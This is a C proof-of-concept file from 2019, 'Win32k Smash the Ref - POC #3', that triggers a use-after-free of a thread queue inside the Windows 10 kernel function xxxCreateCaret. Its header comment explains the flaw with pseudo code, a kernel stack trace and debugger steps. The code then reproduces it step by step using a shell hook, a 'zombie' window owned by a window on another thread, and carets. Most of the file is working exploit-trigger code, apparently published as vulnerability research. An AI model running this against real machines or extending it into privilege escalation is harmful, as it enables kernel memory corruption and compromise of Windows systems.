//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #3 - xxxCreateCaret PQ UAF
// Windows 10 x64
//

/*
UAF of a PQ inside xxxCreateCaret after zzzInternalDestroyCaret.

Relevant vulnerable psuedo code:
xxxCreateCaret:
{
  PQ pq = GetCurrentW32Thread()->pq;
  // Inside, the zombie is smashed with last ref released, and PQ reallocation happens.
  if (pq->caret) zzzInternalDestroyCaret();
  pq->field1 ... // pq used here is actually UAF.
}

In xxxCreateCaret they hold a dumb pointer to current's thread-queue,
then releases previous caret and then uses the thread-queue again through that pointer.

Given our goal is to create a UAF condition, and knowing that a caret is associated with a window
(technically a caret holds a reference to its window) -
We're actually creating a situation where the previous caret will be smashed right inside xxxCreateCaret.
Inside zombie's xxxDestroyWindow it will call AttachThreadInput,
only if there's an owner window from another thread,
indicating to detach the thread from its owner's thread-queue.
Once detachment is happening, it will reallocate the thread-queue again, according to behavior of their algorithm.
Making the thread-queue dumb pointer used initially in xxxCreateCaret now UAFing.

So we have to zombie-reload an owner window from another thread, together with a caret.
This is what steps #3 and #4 do in the code below.

This is the stack trace of the vulnerability:
00 win32kbase!zzzDestroyQueue
01 win32kfull!zzzAttachToQueue+0x18d
02 win32kfull!zzzReattachThreads+0x17f
03 win32kfull!zzzAttachThreadInput+0x23e			; Trigger releasing of the thread-queue
05 win32kfull!xxxDestroyWindow+0x5ec				; Zombie is destroyed
06 win32kbase!xxxDestroyWindowIfSupported+0x25
07 win32kbase!HMDestroyUnlockedObject+0x69
08 win32kbase!ThreadUnlock1+0x84
09 win32kfull!zzzInternalDestroyCaret+0xaa
0a win32kfull!xxxCreateCaret+0x75
0b win32kfull!NtUserCreateCaret+0x89				; CreateCaret from Step #4 in main below.

To see the UAF one should set a breakpoint on xxxCreateCaret and walk over zzzInternalDestroyCaret,
the next touch of the pq pointer should now point to a freed memory.

It's also possible to set a breakpoint on zzzDestroyQueue (before walking over the xxxCreateCaret)
and see that it will eventually free the queue.
Important note - Since thread-queues are allocated from a lookaside list, they may actually still be allocated in terms of !pool,
but logically they are freed and lookaside-list shaping could take place to make sure it's really really freed, but that's out of scope.
*/

#include <windows.h>
#include <stdio.h>

HWND g_hWnd1 = NULL; // This is the target zombie window.
HWND g_hWnd2 = NULL; // hWnd2 is the owner of hWnd1 from another thread.
// All thread ID's, required for AttachThreadInput.
HHOOK g_hShellHook = NULL;

DWORD CALLBACK threadproc2(LPVOID)
{
	// Create owner window.
	g_hWnd2 = CreateWindow("ScrollBar", NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	Sleep(1000000);

	return 0;
}

LRESULT CALLBACK shellHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HSHELL_WINDOWDESTROYED)
	{
		static int once = 1;
		if (once)
		{
			once = 0;
			UnhookWindowsHookEx(g_hShellHook);

			printf("Step #2\n");
			// Destroy window.
			DestroyWindow(g_hWnd1);

			// Goes back to main's SetWindowLongPtr.
		}
	}
	return 0;
}

LRESULT CALLBACK wndproc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	// This message is sent from DestroyWindow from the shell hook proc.
	if (msg == WM_NCDESTROY)
	{
		printf("Step #3\n");
		printf("Creating caret from WM_NCDESTROY.\n");

		// Window is going to be zombie because this caret is created post its cleanup phase inside xxxDestroyWindow.
		// In fact, this caret will hold the last reference on this zombie, once we're back from SetWindowLongPtr in main.
		CreateCaret(hWnd, (HBITMAP)1, 1, 1);

		// Goes back to shellHookProc.
	}

	return DefWindowProc(hWnd, msg, wParam, lParam);
}

#if 0

int ok = 0;

DWORD CALLBACK threadproc4(LPVOID)
{
	CreateWindow("ScrollBar", NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	ok = 1;
	Sleep(100000);

	return 0;
}

void FillQLookaside()
{
	HANDLE hs[4] = { 0 };
	for (int i = 0; i < 4; i++)
	{
		ok = 0;
		HANDLE t = CreateThread(NULL, 0, threadproc4, NULL, 0, NULL);
		hs[i] = t;
		while (!ok) Sleep(10);
		SuspendThread(t);
	}

	for (int i = 0; i < 4; i++)
	{
		TerminateThread(hs[i], 1);
	}
}

#endif

int main()
{
	MessageBox(0, 0, 0, 0);

	// Create dummy window.
	HWND hWnd0 = CreateWindow("ScrollBar", NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	// Owner window thread
	CreateThread(NULL, 0, threadproc2, NULL, 0, NULL);
	// Wait for window to be created from other thread.
	while (g_hWnd2 == NULL) Sleep(10);

	WNDCLASS wc = { 0 };
	wc.lpfnWndProc = wndproc;
	wc.lpszClassName = "blaclass";
	RegisterClass(&wc);
	g_hWnd1 = CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	ShowWindow(g_hWnd1, SW_SHOW);
	SetActiveWindow(g_hWnd1);

	printf("Step #1\n");

	// Set owner window to a window that belongs to a different thread.
	// Do zombie reloading inside xxxHandleOwnerSwitch.
	// Note that xxxHandleOwnerSwitch also calls zzzAttachThreadInput to fix intended behavior with owner window of another thread.
	g_hShellHook = SetWindowsHookEx(WH_SHELL, shellHookProc, NULL, GetCurrentThreadId());
	// That side effect stays even though the window is destroyed as the detachment happened already *before* we set it, therefore we don't have to re-do it.
	// In other words, You can assume a call to AttachThreadInput(currentThread, thread2, TRUE) is called inside the next call.
	SetWindowLongPtr(g_hWnd1, GWLP_HWNDPARENT, (LONG_PTR)g_hWnd2);

	// At this point:
	// 1) we know that current thread is sharing a queue with thread 2 of the owner window.
	// 2) we got a zombie window held by a last reference of a caret. The caret is a resource of a thread-queue.
	// Only when the thread-queue is gone, it will let go of the zombie window too.

	// Once a new caret is created, it first destroys the previous caret, smashing g_hWnd1.
	// When g_hWnd1 zombie's going down, it sees that the owner window belongs to a different thread, and detaches the thread-queues.
	// Technically it just calls AttachThreadInput(currentThread, thread2, *FALSE*);
	// Part of the logic of thread-queue detachment is to reallocate some thread-queues (ones that are shared among processes, like ours),
	// hence rendering the one used in xxxCreateCaret stale.

	printf("Step #4\n");
	//FillQLookaside();

	// Just create a caret on another window, but of the same thread-queue, which will start the chain-effect.
	// PQ will be released inside xxxCreateCaret, and will do UAF Lock...
	CreateCaret(hWnd0, (HBITMAP)1, 1, 1);

	return 0;
}
